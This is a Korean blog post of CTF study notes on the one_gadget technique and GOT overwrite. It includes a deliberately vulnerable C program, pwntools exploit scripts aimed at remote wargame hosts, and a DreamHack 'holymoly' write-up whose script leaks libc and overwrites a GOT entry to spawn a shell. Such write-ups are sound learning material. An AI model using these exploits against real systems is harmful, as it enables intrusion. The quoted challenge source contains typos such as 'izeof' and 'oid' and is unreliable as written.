---
tistoryBlogName: k0n9
tistoryTitle: GOT Overwrite
tistoryVisibility: "3"
tistoryCategory: "1117646"
tistorySkipModal: true
tistoryPostId: "29"
tistoryPostUrl: https://k0n9.tistory.com/29
---
### one gadget

조건이 충족되면 한번에 셸을 따버리는 가젯이다. 
##### 분석
리눅스 명령어 strings를 이용해서 libc.so.6 파일에서 /bin/sh 문자열을 찾아낸다.
![](https://i.imgur.com/rZayjuj.png)

그리고 objdump로 /bin/sh 가 들어간 곳을 모두 찾아낸 후 근처에 execve 함수가 있는 곳을 찾아본다.
![](https://i.imgur.com/U5hVhQW.png)
이런식으로 one gadget을 찾을 수 있다.

그리고 이것을 one shot gadget 툴을 이용해서 쉽게 찾을 수 있다.
![](https://i.imgur.com/IrC0WlV.png)
이는 
offset 값 함수의 형태
constraints:
	조건

와 같은 형태를 지닌다.


![](https://i.imgur.com/M2srZXy.png)

예를 들어서 이 부분에 해당하는 부분을 보면 아래와 같다.

![](https://i.imgur.com/uD33J05.png)

조건이 충족되면 execve(”/bin/sh”, rsp+0x30, environ) 라는 함수가 실행이된다. 그리고 그 조건으로는 rsp+0x30부분이 null이면 된다. rsp+0x30이 null이면 결과적으로는 execve(”/bin/sh”, 0, environ)

environ은 c언어에서 기본 제공하는 환경변수 배열의 전역변수로 여기서는 0이 들어간다. 즉 execve(”/bin/sh”, 0, 0)이 실행된다. 어셈블리어를 보면

```c
mov rax, QWORD [rip+0x37ec47]  //rax에 environ 관 주소를 넣는다. 
lea rdi, [rip+0x147adf]        //즉 rdi에 /bin/sh의 주소가 들어간다 
lea rsi, [rsp+0x30]            //위에서 봤던 조건인 rsp+0x30이다. 즉 이 부분은 0이여야 한다. 
mov rdx, QWORD PTR [rax]      //rax의 주소 즉 환경변수의 포인터를 넣는다. 이 부분은 0이다.
```
결과적으로 call execve로 execve(”/bin/sh”, 0, 0) 가 실행이 된다.




### GOT Overwrite
Dynamic Link방식으로 컴파일된 프로그램이 공유 라이브러리를 호출할 때 사용되는 PLT와 GOT를 이용한 공격 기법이다.

#### 공격 방법

- GOT 변조
  
  PLT는 GOT를 참조하고, GOT에는 함수의 실제 주소가 들어있는데 이 GOT의 값을 원하는 함수의 실제 주소로 변조시키면 원래 함수가 아닌 변조된 함수가 호출된다.

예를 들면, printf(“/bin/sh”);에서 printf함수를 system으로 변조시키면 system(“/bin/sh”);가 되어 셸을 실행시킨다.

#### 예제

checksec
![](https://i.imgur.com/CNv7VRj.png)

c코드
```c
// gcc got_overwrite.c -o got_overwrite -O0 -no-pie
#include <stdio.h>
#include <stdlib.h>
  
void initialize(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
  
void win(){
    system("/bin/sh");
}
  
int main(){
    unsigned long long addr = 0;
  
    initialize();
    printf("Addr : ");
    scanf("%lld", &addr);
    printf("Value : ");
    scanf("%lld", (void *)addr);
    printf("bye byegdg~");
  
    return 0;
}
```

익스플로잇:
첫번째 입력에서 addr에 주소를 넣고 두 번째 입력에서 addr의 주소를 참조한다. 그러니 첫번째 입력에서 printf의 got주소를 넣고 두번째 입력에서 win의 주소를 넣어주면 된다. 여기서 입력을 받을때 %d로 받으니 10진수로 입력을 해야 한다.

```python
from pwn import *
  
# context.log_level = 'debug'
  
p = remote("211.229.250.118", 33032)
  
e = ELF('./baby_got_overwrite')
  
p.sendafter("Addr : ",  '\x34\x32\x31\x30\x37\x32\x38')  
p.sendline()
p.sendafter("Value : ", str(4198909))  
p.sendline()
p.interactive()
```

### DreamHack_Holymoly
```C
/* holymoly.c
 * gcc -Wall -no-pie -s holymoly.c -o holymoly
*/
  
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
  
#define HOLYMOLY_ID         0
#define ROLYPOLY_ID         1
#define MONOPOLY_ID         2
#define GUACAMOLE_ID        3
#define ROBOCARPOLI_ID      4
#define HALLIGALLI_ID       5
#define BROCCOLI_ID         6
#define BORDERCOLLIE_ID     7
#define BLUEBERRY_ID        8
#define CRANBERRY_ID        9
#define MYSTERY_ID          10
#define INVALID_ID          11
  
#define HOLYMOLY        "holymoly"
#define ROLYPOLY        "rolypoly"
#define MONOPOLY        "monopoly"
#define GUACAMOLE       "guacamole"
#define ROBOCARPOLI     "robocarpoli"
#define HALLIGALLI      "halligalli"
#define BROCCOLI        "broccoli"
#define BORDERCOLLIE    "bordercollie"
#define BLUEBERRY       "blueberry"
#define CRANBERRY       "cranberry"
#define MYSTERY         "mystery"
  
#define SWITCH_VAL      0
#define SWITCH_PTR      1

 
struct phrase_t {
    uint8_t id;
    char *str;
    size_t len;
};
  
const struct phrase_t phrases[11] = {
    {.id = HOLYMOLY_ID,      .str = HOLYMOLY,     .len = izeof(HOLYMOLY)},
    {.id = ROLYPOLY_ID,      .str = ROLYPOLY,     .len = izeof(ROLYPOLY)},
    {.id = MONOPOLY_ID,      .str = MONOPOLY,     .len = izeof(MONOPOLY)},
    {.id = GUACAMOLE_ID,     .str = GUACAMOLE,    .len = izeof(GUACAMOLE)},
    {.id = ROBOCARPOLI_ID,   .str = ROBOCARPOLI,  .len = sizeof(ROBOCARPOLI)},
    {.id = HALLIGALLI_ID,    .str = HALLIGALLI,   .len = izeof(HALLIGALLI)},
    {.id = BROCCOLI_ID,      .str = BROCCOLI,     .len = izeof(BROCCOLI)},
    {.id = BORDERCOLLIE_ID,  .str = BORDERCOLLIE, .len = izeof(BORDERCOLLIE)},
    {.id = BLUEBERRY_ID,     .str = BLUEBERRY,    .len = izeof(BLUEBERRY)},
    {.id = CRANBERRY_ID,     .str = CRANBERRY,    .len = izeof(CRANBERRY)},

   {.id = MYSTERY_ID,       .str = MYSTERY,      .len = izeof(MYSTERY)},
};
  
int amounts[4] = {0x1000, 0x100, 0x10, 0x1};
  
uint64_t *ptr;  // 0x4040c0
uint64_t val;
uint8_t ptrval_switch;
  
void Init();
void Interpret(char *song);
uint8_t Parse(char *song_ptr);

oid ProcessPhraseID(uint8_t id);
void Increase(int amount);
void Decrease(int amount);
void Read();
void Write();
void OperateSwitch();
  
int main(void) {
    char *song;
  
    Init();
    printf("holymoly? ");
    song = calloc(0xbeef, 1);
    scanf("%48878s", song);
    Interpret(song);
    puts("holymoly!");
}
  
void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
    ptr = NULL;
    val = 0;
}
  
void Interpret(char *song) {
    uint8_t id;
    char *song_ptr;
  
    song_ptr = song;
  
    while (1) {
        id = Parse(song_ptr);
        if (id >= INVALID_ID)
            return;
        ProcessPhraseID(id);
        song_ptr += phrases[id].len - 1;
    }
}
  
uint8_t Parse(char *song_ptr) {
    int i;
  
    for (i = 0; i < sizeof(phrases) / sizeof(phrases[0]); i++)
        if (memcmp(phrases[i].str, song_ptr, phrases[i].len - ) == 0)
           return phrases[i].id;
  
    return INVALID_ID;
}
  
void ProcessPhraseID(uint8_t id) {
    switch (id) {
    case HOLYMOLY_ID ... GUACAMOLE_ID:
        Increase(amounts[id - HOLYMOLY_ID]);
        break;
    case ROBOCARPOLI_ID ... BORDERCOLLIE_ID:
        Decrease(amounts[id - ROBOCARPOLI_ID]);
        break;
    case BLUEBERRY_ID:
        Read();
        break;
    case CRANBERRY_ID:
        Write();
        break;
    case MYSTERY_ID:
        OperateSwitch();
        break;
    }
}
  
void Increase(int amount) {
    if (ptrval_switch)
        ptr = (uint64_t *)((uint8_t *)ptr + amount);
    else
        val += amount;
}
  
void Decrease(int amount) {
    if (ptrval_switch)
        ptr = (uint64_t *)((uint8_t *)ptr - amount);
    else
        val -= amount;
}
  
void Read() {
    write(1, (char *)ptr, 8);
}
  
void Write() {
    *ptr = val;
}
  
void OperateSwitch() {
    ptrval_switch = ptrval_switch ? SWITCH_VAL : SWITCH_PTR;
}
```

이 코드는 holymoly, rolypoly 등을 이용해서 정해진 동작을 하는 코드이다. 동작은 아래와 같다
HOLYMOLY_ID         0x1000 증가

ROLYPOLY_ID         0x100  증가

MONOPOLY_ID         0x10   증가

GUACAMOLE_ID        0x1    증가

ROBOCARPOLI_ID      0x1000 감소

HALLIGALLI_ID       0x100  감소

BROCCOLI_ID         0x10   감소

BORDERCOLLIE_ID     0x1    감소

BLUEBERRY_ID        ptr 참조하여 출력

CRANBERRY_ID        ptr에 참조하여 var 입력

MYSTERY_ID          inc, dec 를 ptr에 할지 var에 할지 스위치

INVALID_ID          11

익스플로잇은 다음과 같이 할 수 있다.
1.  ptr을 printf함수의 got로 한다.
2. ptr을 참조하여 출력한다.
3. one gadget을 구한다.
4. put_got를 main으로 하여 다시 main으로 돌아간다.
5. ptr을 scanf로 하고 var을 one_gadget으로 한다.
6. 다시 main으로 돌아와서 scanf가 실행되면 셸이 따진다.

처음에는 마자막 puts를 one gadget으로 했는데 조건이 안맞아서 scanf로 돌렸다.

```python
from pwn import *
  
context.log_level = 'debug'
  
# p = process("./holymoly")
p = remote("host3.dreamhack.games", 18123)
  
pause()
#define HOLYMOLY_ID         0x1000 증가
#define ROLYPOLY_ID         0x100  증가
#define MONOPOLY_ID         0x10   증가
#define GUACAMOLE_ID        0x1    증가
#define ROBOCARPOLI_ID      0x1000 감소
#define HALLIGALLI_ID       0x100  감소
#define BROCCOLI_ID         0x10   감소
#define BORDERCOLLIE_ID     0x1    감소
#define BLUEBERRY_ID        ptr 참조하여 출력
#define CRANBERRY_ID        ptr에 참조하여 var 입력
#define MYSTERY_ID          inc, dec 를 ptr에 할지 var에 할지 스치함
#define INVALID_ID          11
# 처음 switch는 ptr임
  

ex = b''
ex += b'mystery'
ex += b'holymoly'*0x404    
ex += b'monopoly'*0x2      
ex += b'guacamole'*0x8     
ex += b'blueberry'
ex += b'broccoli'*0x1
ex += b'mystery'
ex += b'holymoly'*0x401    
ex += b'rolypoly'*0x1      
ex += b'monopoly'*0xf
ex += b'guacamole'*0x6     
ex += b'cranberry'

ex += b'mystery'
ex += b'guacamole'*0x8
ex += b'mystery'
ex += b'broccoli'*0xf
ex += b'bordercollie'*0x6
ex += b'cranberry'
  
print(len(ex))
p.sendlineafter(b"? ", ex)
print_add = u64(p.recv(6)+b"\x00\x00")

libc_base = print_add -  0x61c90 # print_off
one_gadget = libc_base + 0xe3b01
print(hex(one_gadget))

one_up = one_gadget // 0x1000000
one_dn = one_gadget % 0x1000000
  
ex2 = b''
ex2 += b'mystery'
ex2 += b'holymoly'*0x404
ex2 += b'rolypoly'*0x0
ex2 += b'monopoly'*0x4
ex2 += b'guacamole'*0x8
ex2 += b'mystery'
for i in range((one_dn // 0x1000)):
    ex2 += b'holymoly'
for i in range(((one_dn % 0x1000) // 0x100)):
    ex2 += b'rolypoly'
for i in range(((one_dn % 0x100) // 0x10)):
    ex2 += b'monopoly'
for i in range((one_dn % 0x10)):
    ex2 += b'guacamole'
ex2 += b'cranberry'
ex2 += b'mystery'
  
ex2 += b'guacamole'*0x3
  
ex2 += b'mystery'
  
if(one_up > one_dn):
    for i in range(((one_up - one_dn) // 0x1000)):
        ex2 += b'holymoly'
    for i in range((((one_up - one_dn) % 0x1000) // 0x100)):
        ex2 += b'rolypoly'
    for i in range((((one_up - one_dn) % 0x100) // 0x10)):
        ex2 += b'monopoly'
    for i in range(((one_up - one_dn) % 0x10)):
        ex2 += b'guacamole'
else:
    for i in range(((one_dn-one_up) // 0x1000)):
        ex2 += b'robocarpoli'
    for i in range((((one_dn-one_up) % 0x1000) // 0x100)):
        ex2 += b'halligalli'
    for i in range((((one_dn - one_up) % 0x100) // 0x10)):
        ex2 += b'broccoli'
    for i in range(((one_dn - one_up) % 0x10)):
        ex2 += b'bordercollie'
  
 
ex2 += b'cranberry'
  
p.sendlineafter(b"? ", ex2)

print(len(ex2))

p.interactive()
```
![](https://i.imgur.com/kPEHC1b.png)
